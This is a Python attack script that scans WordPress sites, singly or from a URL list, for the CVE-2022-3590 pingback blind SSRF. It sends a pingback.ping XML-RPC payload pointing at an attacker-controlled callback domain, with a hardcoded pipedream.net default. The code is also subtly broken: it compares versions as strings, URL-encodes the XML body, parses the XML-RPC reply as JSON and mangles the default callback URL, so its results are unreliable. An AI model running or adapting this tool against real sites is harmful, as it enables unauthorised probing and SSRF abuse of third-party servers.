import requests  
import json  
import urllib.parse  
import re
import argparse

def banner():
    print("########################################################")
    print("# CVE-2022-3590 Scanner                                #")
    print("# Author: @hxlxmj                                      #")
    print("# Github: https://github.com/hxlxmjxbbxs               #")
    print("########################################################")

def get_wordpress_version(url):
    try:
        response = requests.get(url)
    except requests.exceptions.RequestException as e:
        print(f'[-] An error occurred while getting WordPress version: {e}')
        return None
    version = re.search('content="WordPress ([^\s]+)', response.text)
    if version:
        return version.group(1)
    return None

def is_pingback_enabled(url):
    try:
        response = requests.get(url + "/xmlrpc.php?rsd")
    except requests.exceptions.RequestException as e:
        print(f'[-] An error occurred while checking pingback feature: {e}')
        return False
    return '<api name="pingback" blogID="1" preferred="false" apiLink="' + url + '/xmlrpc.php?pingback" />' in response.text

def check_cve_2022_3590(url, domain=None):  
    version = get_wordpress_version(url)
    if version and version > '6.2':
        print(f'[-] The website {url} is not vulnerable to the CVE-2022-3590 vulnerability (WordPress version > 6.2).')
        return
    
    if not is_pingback_enabled(url):
        print(f'[-] The website {url} is not vulnerable to the CVE-2022-3590 vulnerability (Pingback feature is disabled).')
        return

    target_url = url + "/xmlrpc.php"  

    if not domain:  
        domain = 'https://eod51k7v3wd0740.m.pipedream.net'  
    pingback_url = 'http://127.0.0.1/'  
    payload = f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{pingback_url}</string></value></param><param><value><string>http://{domain}/</string></value></param></params></methodCall>'  
    encoded_payload = urllib.parse.quote(payload)  

    try:  
        response = requests.post(target_url, data=encoded_payload)  
        response.raise_for_status()  
    except requests.exceptions.HTTPError as e:
        print(f'[-] HTTP error occurred: {e}')
        return
    except requests.exceptions.RequestException as e:  
        print(f'[-] An error occurred: {e}')  
        return  

    try:  
        data = json.loads(response.text)  
    except json.decoder.JSONDecodeError:  
        data = None  

    if data and 'faultCode' in data and data['faultCode'] == 0:  
        print(f'[+] The website {url} is vulnerable to the CVE-2022-3590 vulnerability!')  
    else:  
        print(f'[-] The website {url} is not vulnerable to the CVE-2022-3590 vulnerability.')  

def main():
    banner()
    parser = argparse.ArgumentParser(description="Check if a given WordPress website is vulnerable to the CVE-2022-3590 vulnerability by exploiting the blind SSRF in the pingback feature.")  
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", help="The URL of the WordPress website to check")  
    group.add_argument("-f", "--file", help="A file containing a list of URLs of WordPress websites to check")
    parser.add_argument("-d", "--domain", help="The domain controlled by the attacker")  
    args = parser.parse_args()  

    if args.file:
        with open(args.file, 'r') as file:
            urls = [url.strip() for url in file.readlines()]
        for url in urls:
            check_cve_2022_3590(url, args.domain)
    else:
        check_cve_2022_3590(args.url, args.domain)

if __name__ == "__main__":  
    main()
